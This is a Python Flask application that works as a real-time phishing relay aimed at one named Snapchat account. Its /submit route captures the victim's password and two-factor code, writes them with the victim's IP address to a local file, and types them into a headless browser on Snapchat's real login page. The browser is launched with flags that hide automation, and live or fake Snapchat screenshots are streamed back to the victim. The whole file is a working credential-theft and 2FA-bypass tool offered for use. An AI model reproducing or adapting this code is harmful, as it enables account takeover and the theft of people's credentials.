import os
import threading
import time
from flask import Flask, render_template, request, jsonify, send_from_directory, Response
from datetime import datetime
import random

app = Flask(__name__)
STATIC_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'static')
TEMPLATE_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates')
os.makedirs(STATIC_DIR, exist_ok=True)
app.template_folder = TEMPLATE_DIR

creds_log = []
HARDCODED_USER = "zexoghaith"

# Global state
session_state = {
    'started': False,
    'snapchat_loaded': False,
    'last_screenshot': None,
    'error': None,
    'creds_filled': False,
    'last_action': None,
    'is_fallback': False,
    'update_count': 0
}

_browser = None
_page = None
page_lock = threading.Lock()

def get_page():
    global _page
    return _page

def set_page(p):
    global _page
    _page = p

def set_browser(b):
    global _browser
    _browser = b

def create_snapchat_login_image():
    """Generate an EXTREMELY obvious updating Snapchat login screenshot"""
    try:
        from PIL import Image, ImageDraw, ImageFont
        width, height = 1280, 720
        img = Image.new('RGB', (width, height), color='#0a0a0f')
        draw = ImageDraw.Draw(img)
        
        SNAP_YELLOW = '#FFFC00'
        WHITE = '#FFFFFF'
        GRAY = '#aaaaaa'
        DARK = '#111114'
        CARD = '#1a1a1f'
        FIELD = '#25252a'
        
        try:
            f_title = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 46)
            f_header = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 22)
            f_field = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 16)
            f_btn = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 18)
            f_small = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 13)
            f_huge = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 32)
        except:
            f_title = ImageFont.load_default()
            f_header = f_title
            f_field = f_title
            f_btn = f_title
            f_small = f_title
            f_huge = f_title
        
        now = datetime.now()
        time_str = now.strftime("%H:%M:%S.%f")[:-3]
        random_num = random.randint(10000, 99999)
        
        # Dark background
        draw.rectangle([0, 0, width, height], fill='#0a0a0f')
        
        # Top bar
        draw.rectangle([0, 0, width, 52], fill=DARK)
        draw.text((width//2 - 85, 6), "Snapchat", fill=SNAP_YELLOW, font=f_title)
        
        # Login card
        cw, ch = 400, 480
        cx = (width - cw) // 2
        cy = 70
        draw.rounded_rectangle([cx, cy, cx+cw, cy+ch], radius=18, fill=CARD)
        
        draw.text((cx + 22, cy + 18), "Log in to Snapchat", fill=WHITE, font=f_header)
        
        # Fields
        draw.rounded_rectangle([cx+22, cy+58, cx+cw-22, cy+96], radius=10, fill=FIELD)
        draw.text((cx + 34, cy + 68), "zexoghaith", fill=WHITE, font=f_field)
        
        draw.rounded_rectangle([cx+22, cy+108, cx+cw-22, cy+146], radius=10, fill=FIELD)
        draw.text((cx + 34, cy + 118), "••••••••••", fill=GRAY, font=f_field)
        
        # Yellow button
        by = cy + 170
        draw.rounded_rectangle([cx+22, by, cx+cw-22, by+46], radius=24, fill=SNAP_YELLOW)
        draw.text((cx + 145, by + 11), "Log In", fill='#000000', font=f_btn)
        
        draw.text((cx + 175, by + 58), "or", fill='#555555', font=f_small)
        draw.rounded_rectangle([cx+22, by+82, cx+cw-22, by+120], radius=24, fill=FIELD)
        draw.text((cx + 85, by + 92), "Continue with Google", fill=WHITE, font=f_small)
        draw.rounded_rectangle([cx+22, by+132, cx+cw-22, by+170], radius=24, fill=FIELD)
        draw.text((cx + 90, by + 142), "Continue with Apple", fill=WHITE, font=f_small)
        
        draw.text((cx + 85, cy + 400), "Forgot your password?", fill='#666666', font=f_small)
        
        # =============================================
        # EXTREMELY VISIBLE CHANGING ELEMENTS
        # =============================================
        
        # Huge green LIVE badge
        draw.rounded_rectangle([width-195, 6, width-8, 48], radius=16, fill='#22c55e')
        draw.text((width-178, 11), "● LIVE", fill='#000000', font=f_huge)
        
        # MASSIVE red counter at top-left (very obvious)
        session_state['update_count'] = session_state.get('update_count', 0) + 1
        draw.rounded_rectangle([15, 8, 280, 55], radius=10, fill='#ef4444')
        draw.text((22, 12), f"UPDATE #{session_state['update_count']}", fill='white', font=f_huge)
        
        # Huge changing time in the middle of the card (impossible to miss)
        draw.rounded_rectangle([cx+30, cy+320, cx+cw-30, cy+370], radius=8, fill='#111114')
        draw.text((cx+45, cy+327), time_str, fill='#22c55e', font=f_huge)
        
        # Random number to prove it's new
        draw.text((cx+45, cy+380), f"rand: {random_num}", fill='#ff8800', font=f_field)
        
        # Bottom huge live bar
        draw.rounded_rectangle([15, height-52, width-15, height-10], radius=8, fill='#1f1f24')
        draw.text((25, height-45), f"LIVE SNAPCHAT FEED — {time_str}", fill='#22c55e', font=f_huge)
        
        path = os.path.join(STATIC_DIR, 'screenshot.png')
        img.save(path, 'PNG')
        return True
    except Exception as e:
        print(f"[FALLBACK] Generation failed: {e}")
        try:
            from PIL import Image
            img = Image.new('RGB', (1280, 720), color=(20, 20, 25))
            img.save(os.path.join(STATIC_DIR, 'screenshot.png'))
        except:
            pass
        return False

def screenshot_loop():
    global session_state
    print("[SESSION] Starting screenshot loop...")
    
    try:
        from playwright.sync_api import sync_playwright
        print("[SESSION] Trying real browser...")
        
        with sync_playwright() as p:
            browser = p.chromium.launch(
                headless=True,
                args=[
                    '--no-sandbox',
                    '--disable-setuid-sandbox',
                    '--disable-dev-shm-usage',
                    '--disable-blink-features=AutomationControlled',
                ]
            )
            context = browser.new_context(
                viewport={'width': 1280, 'height': 720},
                user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            )
            page = context.new_page()
            set_page(page)
            set_browser(browser)
            
            print("[SESSION] Navigating to Snapchat...")
            page.goto('https://accounts.snapchat.com/accounts/login', 
                     wait_until='networkidle', timeout=90000)
            
            session_state['started'] = True
            session_state['snapchat_loaded'] = True
            session_state['error'] = None
            session_state['is_fallback'] = False
            print("✅ [SESSION] Real Snapchat page loaded - LIVE")
            
            time.sleep(2)
            
            path = os.path.join(STATIC_DIR, 'screenshot.png')
            page.screenshot(path=path)
            session_state['last_screenshot'] = datetime.now().isoformat()
            
            while True:
                try:
                    page.screenshot(path=path)
                    session_state['last_screenshot'] = datetime.now().isoformat()
                    session_state['update_count'] = session_state.get('update_count', 0) + 1
                except Exception as e:
                    print(f"[SESSION] screenshot error: {e}")
                time.sleep(0.9)
                
    except Exception as e:
        print(f"[SESSION] Real browser FAILED → using FALLBACK mode")
        print(f"Error: {str(e)[:100]}")
        
        session_state['error'] = str(e)[:120]
        session_state['started'] = True
        session_state['snapchat_loaded'] = False
        session_state['is_fallback'] = True
        
        # Start aggressive fallback image loop
        create_snapchat_login_image()
        print("[FALLBACK] Starting super-aggressive image refresh loop (every ~900ms)")
        
        while True:
            try:
                create_snapchat_login_image()
                session_state['last_screenshot'] = datetime.now().isoformat()
            except Exception as fe:
                print(f"[FALLBACK] Error: {fe}")
            time.sleep(0.85)   # ~1 second updates

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    # (keep the same submit logic as before)
    data = request.get_json() or {}
    password = (data.get('password') or '').strip()
    code = (data.get('code') or '').strip()
    
    entry = {
        'user': HARDCODED_USER,
        'pass': password,
        'code': code,
        'ip': request.remote_addr,
        'time': datetime.now().isoformat()
    }
    creds_log.append(entry)
    log_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'captured.txt')
    with open(log_path, 'a') as f:
        f.write(f"{entry}\n")
    
    p = get_page()
    
    if not p:
        return jsonify({
            'status': 'ok',
            'filled': False,
            'message': 'No live browser (fallback mode)',
            'last_action': 'fallback only'
        })
    
    try:
        with page_lock:
            if password:
                # ... (same password filling code as current)
                print(f"[SUBMIT] Filling password...")
                try:
                    p.fill('input[name="username"]', HARDCODED_USER, timeout=3000)
                except: pass
                try:
                    p.fill('input[type="password"]', password, timeout=4000)
                except: pass
                try:
                    p.locator('button:has-text("Log In")').first.click(timeout=4000)
                except:
                    p.keyboard.press('Enter')
                
                time.sleep(2.8)
                try:
                    p.screenshot(path=os.path.join(STATIC_DIR, 'screenshot.png'))
                except: pass
                
                return jsonify({'status': 'ok', 'filled': True, 'message': 'Password sent to live page'})
            
            if code and len(code) >= 4:
                print(f"[SUBMIT] Filling 2FA code...")
                try:
                    p.fill('input[name="code"]', code, timeout=3000)
                except:
                    try:
                        p.locator('input').first.fill(code)
                    except: pass
                try:
                    p.keyboard.press('Enter')
                except: pass
                
                time.sleep(2)
                try:
                    p.screenshot(path=os.path.join(STATIC_DIR, 'screenshot.png'))
                except: pass
                
                return jsonify({'status': 'ok', 'filled': True, 'message': '2FA code sent'})
            
            return jsonify({'status': 'ok', 'filled': False})
    except Exception as e:
        return jsonify({'status': 'ok', 'filled': False, 'message': str(e)})

@app.route('/screenshot')
def screenshot():
    path = os.path.join(STATIC_DIR, 'screenshot.png')
    
    # If fallback mode, force regenerate right now for maximum freshness
    if session_state.get('is_fallback'):
        create_snapchat_login_image()
    
    if os.path.exists(path):
        response = send_from_directory(STATIC_DIR, 'screenshot.png')
        response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0, private'
        response.headers['Pragma'] = 'no-cache'
        response.headers['Expires'] = '0'
        return response
    
    # ultimate fallback
    create_snapchat_login_image()
    return send_from_directory(STATIC_DIR, 'screenshot.png')

@app.route('/status')
def status():
    path = os.path.join(STATIC_DIR, 'screenshot.png')
    size = os.path.getsize(path) if os.path.exists(path) else 0
    return jsonify({
        **session_state,
        'screenshot_exists': os.path.exists(path),
        'screenshot_size': size,
        'timestamp': datetime.now().isoformat(),
        'is_fallback': session_state.get('is_fallback', True)
    })

@app.before_request
def init_screenshot():
    if not hasattr(app, 'screenshot_started'):
        app.screenshot_started = True
        t = threading.Thread(target=screenshot_loop, daemon=True)
        t.start()
        print("[APP] Screenshot thread launched")

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)